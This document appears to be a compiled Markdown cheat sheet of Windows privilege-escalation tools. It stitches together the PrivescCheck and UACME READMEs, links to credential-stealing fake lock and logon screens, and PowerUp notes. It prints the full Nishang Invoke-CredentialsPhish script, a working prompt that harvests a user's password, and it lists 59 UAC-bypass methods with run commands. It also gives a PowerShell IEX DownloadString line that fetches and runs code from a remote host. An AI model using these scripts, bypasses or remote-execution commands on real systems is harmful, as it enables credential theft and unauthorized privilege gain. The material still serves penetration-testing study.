[![hackingarticles](https://xakep.ru/wp-content/uploads/2016/11/FCKUAC-h.jpg)](https://www.hackingarticles.in/)




[![peass](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/peass.png)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)


<p align="center">
  <img src="https://github.com/itm4n/FullPowers/raw/master/demo.gif">
</p>

#### https://github.com/itm4n/FullPowers



![](https://securityonline.info/wp-content/uploads/2020/02/get-help.png)

#### https://github.com/itm4n/PrivescCheck


## Usage 

Use the script from a PowerShell prompt.
```
PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope Process -Force 
PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 
```

Display output and write to a log file at the same time.
```
PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object "C:\Temp\result.txt"
```

Use the script from a CMD prompt.
```
C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object result.txt"
```

Import the script from a web server.
```
C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PrivescCheck.ps1'); Invoke-PrivescCheck" 
```

https://github.com/Pickfordmatt/SharpLocker

![Working SharpLocker](https://github.com/Pickfordmatt/SharpLocker/blob/master/sharplocker.png?raw=true)

![](https://1.bp.blogspot.com/-vWTZFXpgriQ/XpXLWa3sWUI/AAAAAAAAjjg/BzDVi7-8N9U9mSx8TYYYCeSuAwDKjn2rACLcBGAsYHQ/s1600/19.png)

```
function Invoke-CredentialsPhish
{
<#
.SYNOPSIS
Nishang script which opens a user credential prompt.

.DESCRIPTION
This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.

.EXAMPLE
PS > Invoke-CredentialsPhish

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                $output
                break
            }
        }
    }
}
```

## Yet another Windows Privilege escalation tool, why?

I really like [PowerUp](https://github.com/HarmJ0y/PowerUp) because it can enumerate common vulnerabilities very quickly and without using any third-party tools. The problem is that it hasn't been updated for several years now. The other issue I spotted quite a few times over the years is that it sometimes returns false positives which are quite confusing.

Other tools exist on GitHub but they are __not as complete__ or they have __too many dependencies__. For example, they rely on WMI calls or other command outputs.

Therefore, I decided to make my own script with the following constraints in mind:

- __It must not use third-party tools__ such as `accesschk.exe` from SysInternals.

- __It must not use built-in Windows commands__ such as `whoami.exe` or `netstat.exe`. The reason for this is that I want my script to be able to run in environments where AppLocker (or any other Application Whitelisting solution) is enforced.

- __It must not use built-in Windows tools__ such as `sc.exe` or `tasklist.exe` because you'll often get an __Access denied__ error if you try to use them on __Windows Server 2016/2019__ for instance.

- __It must not use WMI__ because its usage can be restricted to admin-only users.

- Last but not least, it must be compatible with __PowerShell Version 2__. 


## Addressing all the constraints...

- __Third-party tools__

I have no merit, I reused some of the code made by [@harmj0y](https://twitter.com/harmj0y) and [@mattifestation](https://twitter.com/mattifestation). Indeed, PowerUp has a very powerfull function called `Get-ModifiablePath` which checks the ACL of a given file path to see if the current user has write permissions on the file or folder. I modified this function a bit to avoid some false positives though. Before that a service command line argument such as `/svc`could be identified as a vulnerable path because it was interpreted as `C:\svc`. My other contribution is that I made a _registry-compatible_ version of this function (`Get-ModifiableRegistryPath`).

- __Windows built-in windows commands/tools__

When possible, I naturally replaced them with built-in PowerShell commands such as `Get-Process`. In other cases, such as `netstat.exe`, you won't get as much information as you would with basic PowerShell commands. For example, with PowerShell, TCP/UDP listeners can easily be listed but there is no easy way to get the associated Process ID. In this case, I had to invoke Windows API functions.

- __WMI__

You can get a looooot of information through WMI, that's great! But, if you face a properly hardened machine, the access to this interface will be restricted. So, I had to find workarounds. And here comes the __Registry__! Common checks are based on some registry keys but it has a lot more to offer. The best example is services. You can get all the information you need about every single service (except their current state obviously) simply by browsing the registry. This is a huge advantage compared to `sc.exe` or `Get-Service` which depend on the access to the __Service Control Manager__. 

- __PowerShellv2 support__

This wasn't that easy because newer version of PowerShell have very convenient functions or options. For example, the `Get-LocalGroup`function doesn't exist and `Get-ChildItem` doesn't have the `-Depth` option in PowerShellv2. So, you have to work your way around each one of these small but time-consuming issues. 


## Features 

### Current User 

```
Invoke-UserCheck - Gets the usernane and SID of the current user
Invoke-UserGroupsCheck - Enumerates groups the current user belongs to except default and low-privileged ones
Invoke-UserPrivilegesCheck - Enumerates the high potential privileges of the current user's token
Invoke-UserEnvCheck - Checks for sensitive data in environment variables
```

### Services

```
Invoke-InstalledServicesCheck - Enumerates non-default services
Invoke-ServicesPermissionsCheck - Enumerates the services the current user can modify through the service control manager
Invoke-ServicesPermissionsRegistryCheck - Enumerates services that can be modified by the current user in the registry
Invoke-ServicesImagePermissionsCheck - Enumerates all the services that have a modifiable binary (or argument)
Invoke-ServicesUnquotedPathCheck - Enumerates services with an unquoted path that can be exploited
```

### Dll Hijacking

```
Invoke-DllHijackingCheck - Checks whether any of the system path folders is modifiable
```

### Programs

```
Invoke-InstalledProgramsCheck - Enumerates the applications that are not installed by default
Invoke-ModifiableProgramsCheck - Enumerates applications which have a modifiable EXE of DLL file
Invoke-ApplicationsOnStartupCheck - Enumerates the applications which are run on startup
Invoke-RunningProcessCheck - Enumerates the running processes
```

### Credentials

```
Invoke-SamBackupFilesCheck - Checks common locations for the SAM/SYSTEM backup files
Invoke-UnattendFilesCheck - Enumerates Unattend files and extracts credentials 
Invoke-WinlogonCheck - Checks credentials stored in the Winlogon registry key
Invoke-CredentialFilesCheck - Lists the Credential files that are stored in the current user AppData folders
Invoke-VaultCredCheck - Enumerates credentials saved in the Credential Manager
Invoke-VaultListCheck - Enumerates web credentials saved in the Credential Manager
Invoke-GPPPasswordCheck - Lists Group Policy Preferences (GPP) containing a non-empty "cpassword" field
```

### Registry

```
Invoke-UacCheck - Checks whether UAC (User Access Control) is enabled
Invoke-LapsCheck - Checks whether LAPS (Local Admin Password Solution) is enabled
Invoke-PowershellTranscriptionCheck - Checks whether PowerShell Transcription is configured/enabled
Invoke-RegistryAlwaysInstallElevatedCheck - Checks whether the AlwaysInstallElevated key is set in the registry
Invoke-LsaProtectionsCheck - Checks whether LSASS is running as a Protected Process (+ additional checks)
Invoke-WsusConfigCheck - Checks whether the WSUS is enabled and vulnerable (Wsuxploit)
```

### Network

```
Invoke-TcpEndpointsCheck - Enumerates unusual TCP endpoints on the local machine (IPv4 and IPv6)
Invoke-UdpEndpointsCheck - Enumerates unusual UDP endpoints on the local machine (IPv4 and IPv6)
Invoke-WlanProfilesCheck - Enumerates the saved Wifi profiles and extract the cleartext key/passphrase when applicable
```

### Misc

```
Invoke-WindowsUpdateCheck - Checks the last update time of the machine
Invoke-SystemInfoCheck - Gets the name of the operating system and the full version string
Invoke-LocalAdminGroupCheck - Enumerates the members of the default local admin group
Invoke-UsersHomeFolderCheck - Enumerates the local user home folders
Invoke-MachineRoleCheck - Gets the role of the machine (workstation, server, domain controller)
Invoke-SystemStartupHistoryCheck - Gets a list of system startup events 
Invoke-SystemStartupCheck - Gets the last system startup time
Invoke-SystemDrivesCheck - Gets a list of local drives and network shares that are currently mapped
```



![hot](https://i2.wp.com/1.bp.blogspot.com/-sZznJHASMh8/Xo2xvENIRRI/AAAAAAAAjbc/aDlr4VWuH6kXlmh_mE2UZ-xgnrQLoccZQCLcBGAsYHQ/s1600/0.png?w=687&ssl=1)
### [Сброс учетных данных: SAM](https://www.hackingarticles.in/credential-dumping-sam/)

![](https://raw.githubusercontent.com/hlldz/pickl3/master/pickl3.png)

### https://github.com/hlldz/pickl3
### https://github.com/bitsadmin/fakelogonscreen



## System Requirements

### https://github.com/hfiref0x/UACME

* x86-32/x64 Windows 7/8/8.1/10 (client, some methods however works on server version too).
* Admin account with UAC set on default settings required.

# Usage

Run executable from command line: akagi32 [Key] [Param] or akagi64 [Key] [Param]. See "Run examples" below for more info.

First param is number of method to use, second is optional command (executable file name including full path) to run. Second param can be empty - in this case program will execute elevated cmd.exe from system32 folder.

Keys (watch debug output with dbgview or similar for more info):

1. Author: Leo Davidson
   * Type: Dll Hijack
   * Method: IFileOperation
   * Target(s): \system32\sysprep\sysprep.exe
   * Component(s): cryptbase.dll
   * Implementation: ucmStandardAutoElevation   
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 8.1 (9600)
      * How: sysprep.exe hardened LoadFrom manifest elements
2. Author: Leo Davidson derivative
   * Type: Dll Hijack
   * Method: IFileOperation
   * Target(s): \system32\sysprep\sysprep.exe
   * Component(s): ShCore.dll
   * Implementation: ucmStandardAutoElevation
   * Works from: Windows 8.1 (9600)
   * Fixed in: Windows 10 TP (> 9600)
      * How: Side effect of ShCore.dll moving to \KnownDlls
3. Author: Leo Davidson derivative by WinNT/Pitou
   * Type: Dll Hijack
   * Method: IFileOperation
   * Target(s): \system32\oobe\setupsqm.exe
   * Component(s): WdsCore.dll
   * Implementation: ucmStandardAutoElevation
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 10 TH2 (10558)
      * How: Side effect of OOBE redesign
4. Author: Jon Ericson, WinNT/Gootkit, mzH
   * Type: AppCompat
   * Method: RedirectEXE Shim
   * Target(s): \system32\cliconfg.exe
   * Component(s): -
   * Implementation: ucmShimRedirectEXE
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 10 TP (> 9600)
      * How: Sdbinst.exe autoelevation removed, KB3045645/KB3048097 for rest Windows versions
5. Author: WinNT/Simda
   * Type: Elevated COM interface
   * Method: ISecurityEditor
   * Target(s): HKLM registry keys
   * Component(s): -
   * Implementation: ucmSimdaTurnOffUac
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 10 TH1 (10147)
      * How: ISecurityEditor interface method changed
6. Author: Win32/Carberp
   * Type: Dll Hijack
   * Method: WUSA
   * Target(s): \ehome\mcx2prov.exe, \system32\migwiz\migwiz.exe
   * Component(s): WdsCore.dll, CryptBase.dll, CryptSP.dll
   * Implementation: ucmWusaMethod
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 10 TH1 (10147)
      * How: WUSA /extract option removed
7. Author: Win32/Carberp derivative
   * Type: Dll Hijack
   * Method: WUSA
   * Target(s): \system32\cliconfg.exe
   * Component(s): ntwdblib.dll
   * Implementation: ucmWusaMethod
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 10 TH1 (10147)
      * How: WUSA /extract option removed
8. Author: Leo Davidson derivative by Win32/Tilon
   * Type: Dll Hijack
   * Method: IFileOperation
   * Target(s): \system32\sysprep\sysprep.exe
   * Component(s): Actionqueue.dll
   * Implementation: ucmStandardAutoElevation
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 8.1 (9600)
      * How: sysprep.exe hardened LoadFrom manifest
9. Author: Leo Davidson, WinNT/Simda, Win32/Carberp derivative
   * Type: Dll Hijack
   * Method: IFileOperation, ISecurityEditor, WUSA
   * Target(s): IFEO registry keys, \system32\cliconfg.exe
   * Component(s): Attacker defined Application Verifier Dll
   * Implementation: ucmAvrfMethod
   * Works from: Windows 7 (7600)
   * Fixed in: Windows 10 TH1 (10147)
      * How: WUSA /extract option removed, ISecurityEditor interface method changed
10. Author: WinNT/Pitou, Win32/Carberp derivative
      * Type: Dll Hijack
      * Method: IFileOperation, WUSA
      * Target(s): \system32\\{New}or{Existing}\\{autoelevated}.exe, e.g. winsat.exe
      * Component(s): Attacker defined dll, e.g. PowProf.dll, DevObj.dll
      * Implementation: ucmWinSATMethod
      * Works from: Windows 7 (7600)
      * Fixed in: Windows 10 TH2 (10548) 
        * How: AppInfo elevated application path control hardening
11. Author: Jon Ericson, WinNT/Gootkit, mzH
      * Type: AppCompat
      * Method: Shim Memory Patch
      * Target(s): \system32\iscsicli.exe
      * Component(s): Attacker prepared shellcode
      * Implementation: ucmShimPatch
      * Works from: Windows 7 (7600)
      * Fixed in: Windows 8.1 (9600)
         * How: Sdbinst.exe autoelevation removed, KB3045645/KB3048097 for rest Windows versions
12. Author: Leo Davidson derivative
      * Type: Dll Hijack
      * Method: IFileOperation
      * Target(s): \system32\sysprep\sysprep.exe
      * Component(s): dbgcore.dll
      * Implementation: ucmStandardAutoElevation
      * Works from: Windows 10 TH1 (10240)
      * Fixed in: Windows 10 TH2 (10565)
        * How: sysprep.exe manifest updated
13. Author: Leo Davidson derivative
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system32\mmc.exe EventVwr.msc
     * Component(s): elsext.dll
     * Implementation: ucmMMCMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS1 (14316)
        * How: Missing dependency removed
14. Author: Leo Davidson, WinNT/Sirefef derivative
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system\credwiz.exe, \system32\wbem\oobe.exe
     * Component(s): netutils.dll
     * Implementation: ucmSirefefMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 TH2 (10548)
        * How: AppInfo elevated application path control hardening
15. Author: Leo Davidson, Win32/Addrop, Metasploit derivative
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system32\cliconfg.exe
     * Component(s): ntwdblib.dll
     * Implementation: ucmGenericAutoelevation
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS1 (14316)
        * How: Cliconfg.exe autoelevation removed
16. Author: Leo Davidson derivative
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system32\GWX\GWXUXWorker.exe, \system32\inetsrv\inetmgr.exe
     * Component(s): SLC.dll
     * Implementation: ucmGWX
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS1 (14316)
        * How: AppInfo elevated application path control and inetmgr executable hardening
17. Author: Leo Davidson derivative
     * Type: Dll Hijack (Import forwarding)
     * Method: IFileOperation
     * Target(s): \system32\sysprep\sysprep.exe
     * Component(s): unbcl.dll
     * Implementation: ucmStandardAutoElevation2
     * Works from: Windows 8.1 (9600)
     * Fixed in: Windows 10 RS1 (14371)
        * How: sysprep.exe manifest updated
18. Author: Leo Davidson derivative
     * Type: Dll Hijack (Manifest)
     * Method: IFileOperation
     * Target(s): \system32\taskhost.exe, \system32\tzsync.exe (any ms exe without manifest)
     * Component(s): Attacker defined
     * Implementation: ucmAutoElevateManifest
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS1 (14371)
        * How: Manifest parsing logic reviewed
19. Author: Leo Davidson derivative
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system32\inetsrv\inetmgr.exe
     * Component(s): MsCoree.dll
     * Implementation: ucmInetMgrMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS1 (14376)
        * How: inetmgr.exe executable manifest hardening, MitigationPolicy->ProcessImageLoadPolicy->PreferSystem32Images
20. Author: Leo Davidson derivative
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system32\mmc.exe, Rsop.msc
     * Component(s): WbemComn.dll
     * Implementation: ucmMMCMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS3 (16232)
        * How: Target requires wbemcomn.dll to be signed by MS
21. Author: Leo Davidson derivative
     * Type: Dll Hijack
     * Method: IFileOperation, SxS DotLocal
     * Target(s): \system32\sysprep\sysprep.exe
     * Component(s): comctl32.dll
     * Implementation: ucmSXSMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS3 (16232)
        * How: MitigationPolicy->ProcessImageLoadPolicy->PreferSystem32Images
22. Author: Leo Davidson derivative
     * Type: Dll Hijack
     * Method: IFileOperation, SxS DotLocal
     * Target(s): \system32\consent.exe
     * Component(s): comctl32.dll
     * Implementation: ucmSXSMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
23. Author: Leo Davidson derivative
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system32\pkgmgr.exe
     * Component(s): DismCore.dll
     * Implementation: ucmDismMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
24. Author: BreakingMalware
     * Type: Shell API
     * Method: Environment variables expansion
     * Target(s): \system32\CompMgmtLauncher.exe
     * Component(s): Attacker defined
     * Implementation: ucmCometMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS2 (15031)
        * How: CompMgmtLauncher.exe autoelevation removed
25. Author: Enigma0x3
     * Type: Shell API
     * Method: Registry key manipulation
     * Target(s): \system32\EventVwr.exe, \system32\CompMgmtLauncher.exe
     * Component(s): Attacker defined
     * Implementation: ucmHijackShellCommandMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS2 (15031)
        * How: EventVwr.exe redesigned, CompMgmtLauncher.exe autoelevation removed
26. Author: Enigma0x3
     * Type: Race Condition
     * Method: File overwrite
     * Target(s): %temp%\GUID\dismhost.exe
     * Component(s): LogProvider.dll
     * Implementation: ucmDiskCleanupRaceCondition
     * Works from: Windows 10 TH1 (10240)
     * AlwaysNotify compatible
     * Fixed in: Windows 10 RS2 (15031)
        * How: File security permissions altered
27. Author: ExpLife
     * Type: Elevated COM interface
     * Method: IARPUninstallStringLauncher
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmUninstallLauncherMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS3 (16199)
        * How: UninstallStringLauncher interface removed from COMAutoApprovalList
28. Author: Exploit/Sandworm
     * Type: Whitelisted component
     * Method: InfDefaultInstall
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmSandwormMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 8.1 (9600)
        * How: InfDefaultInstall.exe removed from g_lpAutoApproveEXEList (MS14-060)
29. Author: Enigma0x3
     * Type: Shell API
     * Method: Registry key manipulation
     * Target(s): \system32\sdclt.exe
     * Component(s): Attacker defined
     * Implementation: ucmAppPathMethod
     * Works from: Windows 10 TH1 (10240)
     * Fixed in: Windows 10 RS3 (16215)
        * How: Shell API update
30. Author: Leo Davidson derivative, lhc645
     * Type: Dll Hijack
     * Method: WOW64 logger
     * Target(s): \syswow64\\{any elevated exe, e.g wusa.exe}
     * Component(s): wow64log.dll
     * Implementation: ucmWow64LoggerMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
31. Author: Enigma0x3
     * Type: Shell API
     * Method: Registry key manipulation
     * Target(s): \system32\sdclt.exe
     * Component(s): Attacker defined
     * Implementation: ucmSdcltIsolatedCommandMethod
     * Works from: Windows 10 TH1 (10240)
     * Fixed in: Windows 10 RS4 (17025)
        * How: Shell API / Windows components update
32. Author: xi-tauw
     * Type: Dll Hijack 
     * Method: UIPI bypass with uiAccess application
     * Target(s): \Program Files\Windows Media Player\osk.exe, \system32\EventVwr.exe, \system32\mmc.exe
     * Component(s): duser.dll, osksupport.dll
     * Implementation: ucmUiAccessMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
33. Author: winscripting.blog
     * Type: Shell API 
     * Method: Registry key manipulation
     * Target(s): \system32\fodhelper.exe, \system32\computerdefaults.exe
     * Component(s): Attacker defined
     * Implementation: ucmMsSettingsDelegateExecuteMethod
     * Works from: Windows 10 TH1 (10240)
     * Fixed in: unfixed :see_no_evil:
        * How: -
34. Author: James Forshaw
     * Type: Shell API 
     * Method: Environment variables expansion
     * Target(s): \system32\svchost.exe via \system32\schtasks.exe
     * Component(s): Attacker defined
     * Implementation: ucmDiskCleanupEnvironmentVariable
     * Works from: Windows 8.1 (9600)
     * AlwaysNotify compatible
     * Fixed in: unfixed :see_no_evil:
        * How: -
35. Author: CIA & James Forshaw
     * Type: Impersonation
     * Method: Token Manipulations
     * Target(s): Autoelevated applications
     * Component(s): Attacker defined
     * Implementation: ucmTokenModification
     * Works from: Windows 7 (7600)
     * AlwaysNotify compatible, see note
     * Fixed in: Windows 10 RS5 (17686)
        * How: ntoskrnl.exe->SeTokenCanImpersonate additional access token check added
36. Author: Thomas Vanhoutte aka SandboxEscaper
     * Type: Race condition
     * Method: NTFS reparse point & Dll Hijack
     * Target(s): wusa.exe
     * Component(s): Attacker defined
     * Implementation: ucmJunctionMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
37. Author: Ernesto Fernandez, Thomas Vanhoutte
     * Type: Dll Hijack
     * Method: SxS DotLocal, NTFS reparse point
     * Target(s): \system32\dccw.exe
     * Component(s): GdiPlus.dll
     * Implementation: ucmSXSDccwMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
38. Author: Clement Rouault
     * Type: Whitelisted component
     * Method: APPINFO command line spoofing
     * Target(s): \system32\mmc.exe
     * Component(s): Attacker defined
     * Implementation: ucmHakrilMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
39. Author: Stefan Kanthak
     * Type: Dll Hijack
     * Method: .NET Code Profiler
     * Target(s): \system32\mmc.exe
     * Component(s): Attacker defined
     * Implementation: ucmCorProfilerMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
40. Author: Ruben Boonen
     * Type: COM Handler Hijack
     * Method: Registry key manipulation
     * Target(s): \system32\mmc.exe, \System32\recdisc.exe
     * Component(s): Attacker defined
     * Implementation: ucmCOMHandlersMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 19H1 (18362)
        * How: Side effect of Windows changes
41. Author: Oddvar Moe
     * Type: Elevated COM interface
     * Method: ICMLuaUtil
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmCMLuaUtilShellExecMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
42. Author: BreakingMalware and Enigma0x3
     * Type: Elevated COM interface
     * Method: IFwCplLua
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmFwCplLuaMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS4 (17134)
        * How: Shell API update
43. Author: Oddvar Moe derivative
     * Type: Elevated COM interface
     * Method: IColorDataProxy, ICMLuaUtil
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmDccwCOMMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
44. Author: bytecode77
     * Type: Shell API
     * Method: Environment variables expansion
     * Target(s): Multiple auto-elevated processes
     * Component(s): Various per target
     * Implementation: ucmVolatileEnvMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS3 (16299)
        * How: Current user system directory variables ignored during process creation
45. Author: bytecode77
     * Type: Shell API
     * Method: Registry key manipulation
     * Target(s): \system32\slui.exe
     * Component(s): Attacker defined
     * Implementation: ucmSluiHijackMethod
     * Works from: Windows 8.1 (9600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
46. Author: Anonymous
     * Type: Race Condition
     * Method: Registry key manipulation
     * Target(s): \system32\BitlockerWizardElev.exe
     * Component(s): Attacker defined
     * Implementation: ucmBitlockerRCMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS4 (>16299)
        * How: Shell API update
47. Author: clavoillotte & 3gstudent
     * Type: COM Handler Hijack
     * Method: Registry key manipulation
     * Target(s): \system32\mmc.exe
     * Component(s): Attacker defined
     * Implementation: ucmCOMHandlersMethod2
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 19H1 (18362)
        * How: Side effect of Windows changes
48. Author: deroko
     * Type: Elevated COM interface
     * Method: ISPPLUAObject
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmSPPLUAObjectMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS5 (17763)
        * How: ISPPLUAObject interface method changed 
49. Author: RinN
     * Type: Elevated COM interface
     * Method: ICreateNewLink
     * Target(s): \system32\TpmInit.exe
     * Component(s): WbemComn.dll
     * Implementation: ucmCreateNewLinkMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS1 (14393) 
        * How: Side effect of consent.exe COMAutoApprovalList introduction
50. Author: Anonymous
     * Type: Elevated COM interface
     * Method: IDateTimeStateWrite, ISPPLUAObject
     * Target(s): w32time service
     * Component(s): w32time.dll
     * Implementation: ucmDateTimeStateWriterMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS5 (17763)
        * How: Side effect of ISPPLUAObject interface change
51. Author: bytecode77 derivative
     * Type: Elevated COM interface
     * Method: IAccessibilityCplAdmin
     * Target(s): \system32\rstrui.exe
     * Component(s): Attacker defined
     * Implementation: ucmAcCplAdminMethod
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 10 RS4 (17134)
        * How: Shell API update
52. Author: David Wells
     * Type: Whitelisted component
     * Method: AipNormalizePath parsing abuse
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmDirectoryMockMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -		
53. Author: Emeric Nasi
     * Type: Shell API
     * Method: Registry key manipulation
     * Target(s): \system32\sdclt.exe
     * Component(s): Attacker defined
     * Implementation: ucmShellDelegateExecuteCommandMethod
     * Works from: Windows 10 (14393)
     * Fixed in: unfixed :see_no_evil:
        * How: -
54. Author: egre55
     * Type: Dll Hijack
     * Method: Dll path search abuse
     * Target(s): \syswow64\SystemPropertiesAdvanced.exe and other SystemProperties*.exe
     * Component(s): \AppData\Local\Microsoft\WindowsApps\srrstr.dll
     * Implementation: ucmEgre55Method
     * Works from: Windows 10 (14393)
     * Fixed in: Windows 10 19H1 (18362)
        * How: SysDm.cpl!_CreateSystemRestorePage has been updated for secured load library call
55. Author: James Forshaw
     * Type: GUI Hack 
     * Method: UIPI bypass with token modification
     * Target(s): \system32\osk.exe, \system32\msconfig.exe
     * Component(s): Attacker defined
     * Implementation: ucmTokenModUIAccessMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -
56. Author: Hashim Jawad
     * Type: Shell API
     * Method: Registry key manipulation
     * Target(s): \system32\WSReset.exe
     * Component(s): Attacker defined
     * Implementation: ucmShellDelegateExecuteCommandMethod
     * Works from: Windows 10 (17134)
     * Fixed in: unfixed :see_no_evil:
        * How: -
57. Author: Leo Davidson derivative by Win32/Gapz
     * Type: Dll Hijack
     * Method: IFileOperation
     * Target(s): \system32\sysprep\sysprep.exe
     * Component(s): unattend.dll
     * Implementation: ucmStandardAutoElevation
     * Works from: Windows 7 (7600)
     * Fixed in: Windows 8.1 (9600)
        * How: sysprep.exe hardened LoadFrom manifest elements
58. Author: RinN
     * Type: Elevated COM interface
     * Method: IEditionUpgradeManager
     * Target(s): \system32\clipup.exe
     * Component(s): Attacker defined
     * Implementation: ucmEditionUpgradeManagerMethod
     * Works from: Windows 10 (14393)
     * Fixed in: unfixed :see_no_evil:
        * How: -
59. Author: James Forshaw
     * Type: AppInfo ALPC
     * Method: RAiLaunchAdminProcess and DebugObject
     * Target(s): Attacker defined
     * Component(s): Attacker defined
     * Implementation: ucmDebugObjectMethod
     * Works from: Windows 7 (7600)
     * Fixed in: unfixed :see_no_evil:
        * How: -		

Note:
* Method (6) unavailable in wow64 environment starting from Windows 8;
* Method (11) (54) implemented only in x86-32 version;
* Method (13) (19) (30) (50) implemented only in x64 version;
* Method (14) require process injection, wow64 unsupported, use x64 version of this tool;
* Method (26) is still working, however it main advantage was UAC bypass on AlwaysNotify level. Since 15031 it is gone;
* Method (30) require x64 because it abuses WOW64 subsystem feature;
* Method (35) AlwaysNotify compatible as there always will be running autoelevated apps or user will have to launch them anyway;
* Method (55) is not really reliable (as any GUI hacks) and included just for fun.

Run examples:
* akagi32.exe 1
* akagi64.exe 3
* akagi32 1 c:\windows\system32\calc.exe
* akagi64 3 c:\windows\system32\charmap.exe

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


# Options
- Missing Patches
- Automated Deployment and Auto Logon Passwords
- AlwaysInstallElevated (any user can run MSI as SYSTEM)
- Misconfigured Services

# References
> - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
> - http://www.greyhathacker.net/?p=738
> - https://toshellandback.com/2015/11/24/ms-priv-esc
> - https://www.toshellandback.com/2015/08/30/gpp/
> - https://blog.ropnop.com/using-credentials-to-own-windows-boxes/

# Guides
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
- Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html

# Tools
- BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows
- Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester

# PowerUp

PowerUp to check for all service misconfigurations:
```
Invoke-AllChecks
```

## Service Unquoted Path

```
Get-ServiceUnquoted -Verbose
```

```
